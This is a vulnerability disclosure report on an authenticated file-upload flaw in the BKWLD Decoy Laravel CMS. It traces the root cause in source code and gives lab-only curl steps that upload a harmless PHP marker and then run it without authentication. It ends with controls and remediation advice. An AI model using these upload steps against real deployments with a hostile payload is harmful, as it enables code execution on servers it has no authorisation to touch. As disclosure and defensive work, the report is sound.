**Report type:** Vulnerability disclosure / reproducible lab report  
**Reporter:** Rony Ahmed  
**CVE:** Not assigned; request triage by VulDB/vendor/CNA  
**Vendor:** BKWLD (Bukwild)  
**Product:** Decoy — Laravel model-based CMS (`bkwld/decoy`)  
**Affected versions:** Not yet determined. The behavior below was reproduced against the tested development snapshot only; do not assume a release range until tagged releases are checked.  
**Vulnerability class:** CWE-434 — Unrestricted Upload of File with Dangerous Type  
**Potential impact:** Authenticated arbitrary file upload can result in unauthenticated PHP code execution when the uploaded file is stored under the web document root and PHP execution is enabled for that directory.  
**Test date:** 2026-10-29/30  
**Test scope:** Disposable local lab; requests limited to `127.0.0.1`  

## Summary

The Redactor upload endpoint in BKWLD Decoy passes the uploaded file directly to the bundled `bkwld/upchuck` storage component without validating the extension or file content. The storage component sanitizes filename characters but preserves the file extension. With the default storage configuration, uploads are placed in `public/uploads` and exposed under `/uploads/`.

In the tested deployment, an authenticated Decoy administrator uploaded a harmless PHP marker file through `POST /admin/redactor`. The endpoint returned HTTP 200 and a public file link. A separate unauthenticated client then requested that link and received HTTP 200 with the marker rendered by PHP; the response did not contain the PHP source. This confirms unauthenticated PHP code execution for the tested configuration after an authenticated upload.

**Authentication boundary:** Uploading requires an authenticated Decoy administrator session and a valid CSRF token. Fetching and executing the uploaded PHP file did not require a session, CSRF token, or API key. This is not an unauthenticated-upload vulnerability.

## Product and test environment

| Item | Value |
|---|---|
| Product | `bkwld/decoy` (Decoy CMS) |
| Supplied source snapshot identifier | `42760c792cdbd4649b56fcb6f468f8eae31ea53f` |
| Runtime package metadata reported | `dev-main @ 612eb0232bb362cd90bae515bd81a6b62f02b7ba` |
| PHP | 7.4.33 (VC15 x64 ZTS) |
| Laravel | 5.6.40 |
| `bkwld/upchuck` | 2.6.1 (`284b122d0c60`) |
| `league/flysystem` | 1.1.10 |
| Web server | PHP built-in server, bound to loopback: `php -S 127.0.0.1:8000 -t public server.php` |
| Document root | Laravel `public/` directory |
| Database/session | SQLite / file session driver |
| Upload storage | Upchuck defaults: local driver, `public_path('uploads')`, public visibility, `/uploads/` URL prefix |
| Account | Disposable administrator created only in the lab |

The Decoy source was installed through a Composer path repository in a disposable Laravel host. The supplied archive did not establish a released-version range. The two source/package identifiers above are recorded for triage; they should not be treated as proof that any particular tagged release is affected.

## Technical details and root cause

### 1. Redactor passes the request file directly to storage

File: `classes/Controllers/Redactor.php`

```php
public function store()
{
    return response()->json([
        'filelink' => app('upchuck.storage')->moveUpload(request()->file('file'))
    ]);
}
```

The handler shown above contains no extension allowlist, content validation, image re-encoding, or other file-type restriction before storing the upload.

### 2. The storage path generation preserves the extension

File: `bkwld/upchuck/src/Storage.php`

The `makeNestedAndUniquePath()` logic sanitizes unsafe filename characters with a pattern equivalent to:

```php
$filename = preg_replace('#[^\w\\-\_\. ]#i', '\_', $filename);
$ext = pathinfo($filename, PATHINFO_EXTENSION);
```

Because the dot is permitted, a filename such as `decoy_rce_marker.php` can retain its `.php` extension. The sanitization is not an executable-file restriction.

### 3. Redactor is available to authenticated admins

File: `classes/Auth/Policy.php`

```php
// Allow all admins to upload to redactor
if ($controller == 'redactor') {
    return true;
}
```

This rule permits the Redactor controller for every authenticated Decoy admin without a separate Redactor permission check. The upload route is registered in the `decoy.protected` middleware group, so the tested application still required login and a valid CSRF token to reach the handler.

### 4. Uploaded files are publicly reachable in the tested deployment

The configured storage directory is `public/uploads`, with URL prefix `/uploads/`. In the tested setup, the upload directory was inside the document root and the PHP built-in server executed `.php` files requested from that directory. There was no upload-directory rule disabling PHP execution.

Execution is deployment-dependent. This test establishes the behavior with the stated PHP built-in server configuration; Apache/Nginx deployments must also have a PHP handler that processes uploaded `.php` files and must not have a rule blocking script execution in the upload directory. Storing uploads outside the web root or disabling script execution prevents this code-execution outcome, although unrestricted file write may remain.

## Reproduction

Perform these steps only on a disposable instance that you own or are explicitly authorized to test. The payload below prints a fixed marker and does not execute operating-system commands or read local files.

### 1. Start the local lab

From the disposable Laravel host directory:

```sh
php -S 127.0.0.1:8000 -t public server.php
```

Create a disposable administrator in the lab database using the Decoy Admin model. Use test-only credentials and do not reuse any real account or password.

### 2. Authenticate

Using a local test client and a cookie jar:

1. `GET /admin` to receive the login form, session cookie, and CSRF token.
2. `POST /admin` with the lab administrator's credentials and CSRF token; the successful login returns a redirect (`302`).
3. `GET /admin/elements` and confirm the authenticated page contains a CSRF token and does not contain the login form's password field.

Abort if the session is not confirmed to be authenticated.

### 3. Create a harmless PHP marker

Save the following as `decoy_rce_marker.php`:

```php
<?php
echo "DECOY_SAFE_PROOF_42\n";
?>
```

### 4. Upload through Redactor

Submit the file as the `file` multipart field, with the authenticated lab session and valid CSRF token. For example, after setting `CSRF_TOKEN` to the token obtained from the authenticated page and creating `./local-test-admin.cookies` from the local login flow:

```sh
curl -i -b ./local-test-admin.cookies \
  -F "_token=${CSRF_TOKEN}" \
  -F 'file=@decoy_rce_marker.php;type=application/x-php' \
  http://127.0.0.1:8000/admin/redactor
```

Do not include real session cookies or CSRF tokens in a public report. Preserve the actual response from the lab for evidence.

### 5. Fetch the returned file link without credentials

Use the `filelink` value returned by the upload response. In the reproduced run, it was:

```text
/uploads/00/02/decoy_rce_marker.php
```

Request that path from a fresh client with no cookies, CSRF token, or API key:

```sh
curl -i http://127.0.0.1:8000/uploads/00/02/decoy_rce_marker.php
```

The file path can vary because Upchuck chooses a nested storage path. Use the actual `filelink` returned by the current run.

## Observed results

### Positive control: authenticated upload, unauthenticated execution

```text
POST /admin/redactor
HTTP 200
Content-Type: application/json
{"filelink":"\/uploads\/00\/02\/decoy_rce_marker.php"}

GET /uploads/00/02/decoy_rce_marker.php
(no cookies, no CSRF token, no API key)
HTTP 200
Content-Type: text/html; charset=UTF-8
marker present: true
raw PHP source present: false
```

The server-side file was present at `public/uploads/00/02/decoy_rce_marker.php` with the `.php` extension preserved. The reported response body contained the rendered marker `DECOY_SAFE_PROOF_42` and did not contain the raw PHP opening tag. This demonstrated execution of the uploaded PHP file in the tested configuration.

### Negative control: unauthenticated upload attempt

```text
POST /admin/redactor
(no session; invalid or missing CSRF token)
HTTP 302
Location: http://127.0.0.1:8000/admin
```

The number of files under `public/uploads` remained unchanged and `control.php` was not written. This confirms that the upload handler itself remained protected by the application's authentication middleware in this test.

### Document-root control

An earlier run with the project root, rather than `public/`, as the document root returned `404` for the stored file because it was outside the served tree. Repeating the test with `public/` as the document root made the file reachable and executable. This demonstrates that the code-execution impact depends on the document-root and PHP-handler configuration.

## Impact

An attacker needs an authenticated Decoy administrator session to upload the file. Possible prerequisites include compromised or weak administrator credentials, a stolen active session, or an already-compromised administrator account. The unconditional Redactor policy rule also means the upload route is allowed to every authenticated admin under this policy implementation.

After upload, any client able to reach the public file URL can request the file without authentication. If PHP execution is enabled for the upload directory, the file runs with the privileges and access available to the PHP/web-server worker. Depending on the deployment and PHP configuration, this may expose application data or secrets or permit further server-side actions. These follow-on actions were not part of the harmless-marker reproduction and should not be treated as separately demonstrated impacts.

**Severity/CVSS:** Not assigned. The final score depends on the affected release range, deployment assumptions, and confirmed privilege boundaries.

## Recommended remediation

1. Apply an allowlist of file types required by Redactor and validate both extension and server-detected content. Reject PHP and other executable/script extensions, including case variants and double extensions.
2. Generate storage names server-side; do not preserve a client-controlled extension unless it has been validated against an allowlist.
3. Store uploads outside the executable document root where possible. Otherwise, explicitly disable script execution in the upload directory at the web-server/PHP-handler level.
4. Serve uploads with safe content headers, including `X-Content-Type-Options: nosniff`; force download for non-image types where appropriate.
5. Replace the unconditional Redactor policy exception with an explicit, auditable permission check.
6. Add regression tests for disallowed extensions, content-type mismatches, missing authorization, public reachability, and the inability to execute scripts from the upload directory.
7. Review other upload paths in the host application for the same class of issue.

## Evidence available

The reported lab evidence consists of the upload HTTP response, a fresh unauthenticated GET response, a negative-control upload attempt, the upload-directory listing, source snippets, and a browser screenshot of the marker page. The tested environment was local-only; no production system, third-party host, or customer data was accessed.

Attach the actual screenshots and complete PoC source as separate files if requested by the submission form. This Markdown document describes the harmless-marker reproduction; it does not embed an unprovided `poc_rce.js` source file.

## Disclosure status and limitations

- No CVE has been assigned.
- The affected release range and fixed version are unknown and require confirmation against tagged releases and/or by the maintainer.
- The confirmed result applies to the exact local configuration described above. Other web servers, storage drivers, and hardened upload directories were not tested.
- The primary reproduction uses a fixed PHP marker only. It does not demonstrate shell access, credential theft, lateral movement, persistence, or post-exploitation.
- Coordinate disclosure timing with the maintainer where possible and do not publish live credentials, session cookies, CSRF tokens, or non-public target details.


